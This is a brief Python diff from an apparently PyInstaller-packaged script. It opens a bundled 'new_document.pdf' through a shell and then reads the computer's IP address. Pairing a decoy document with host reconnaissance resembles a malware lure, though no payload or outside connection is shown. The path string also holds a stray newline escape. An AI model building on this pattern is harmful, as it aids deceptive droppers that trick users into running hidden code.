@@ -6,7 +6,7 @@ import shutil
 import subprocess
 
 file_name = sys._MEIPASS + "\new_document.pdf"
-subprocess.Popen(file_name, shell=true)
+subprocess.Popen(file_name, shell=True)
 
 # Obter o IP do computador
 ip = socket.gethostbyname(socket.gethostname())
